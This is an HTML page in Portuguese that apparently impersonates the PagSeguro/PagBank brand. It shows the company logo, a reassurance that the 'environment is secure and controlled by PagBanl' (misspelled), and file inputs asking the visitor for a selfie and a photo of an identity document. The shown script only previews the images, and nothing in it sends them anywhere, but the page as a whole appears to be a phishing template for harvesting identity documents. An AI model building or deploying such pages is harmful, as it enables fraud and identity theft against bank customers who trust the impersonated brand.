<!DOCTYPE html>
<html lang="pt-br">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" href="/favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" href="./style.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
      rel="stylesheet"
    />
    <title>Selfie e Documento</title>
    <style>
      #selfie-preview {
        width: 200px; /* Customize the width */
        height: auto;
      }
      #doc-preview {
        width: 200px; /* Customize the width */
        height: auto;
      }
    </style>
  </head>
  <body>
    <div id="logo-top">
      <img
        style="position: absolute; width: 120px; margin: -13px -153px"
        src="./images/logopagseguro.png"
        alt=""
      />
      <img
        src="./images/sinal-de-interrogacao.png"
        alt=""
        style="position: absolute;     margin-left: 140px;"
      />
    </div>
    <h1>Esse ambiente e seguro e controlado por PagBanl</h1>
    <p>
      Envie seus documentos para concluir e desfrutar de todos os beneficios
    </p>
    <input id="selfie" type="file" accept="image/*" capture="user" />
    <img id="selfie-preview" src="" alt="Sua Selfie" />
    <input id="doc" type="file" accept="image/*" capture="environment" />
    <img id="doc-preview" src="" alt="Pré-visualização do Documento" />
    <button
      style="
        width: 360px;
        height: 40px;
        font-weight: 800;
        border-radius: 20px;
        border: none;
        color: white;
        background-color: var(--cor--azul);
      "
      id="btn-conf-cel"
    >
      Continuar
    </button>
    <script>
      document
        .getElementById("selfie")
        .addEventListener("change", function (e) {
          const file = e.target.files[0];
          const reader = new FileReader();

          reader.onload = function (e) {
            const preview = document.getElementById("selfie-preview");
            preview.src = e.target.result;
          };

          if (file) {
            reader.readAsDataURL(file);
          }
        });
      document.getElementById("doc").addEventListener("change", function (e) {
        const file = e.target.files[0];
        const reader = new FileReader();

        reader.onload = function (e) {
          const preview = document.getElementById("doc-preview");
          preview.src = e.target.result;
        };

        if (file) {
          reader.readAsDataURL(file);
        }
      });
    </script>
  </body>
</html>
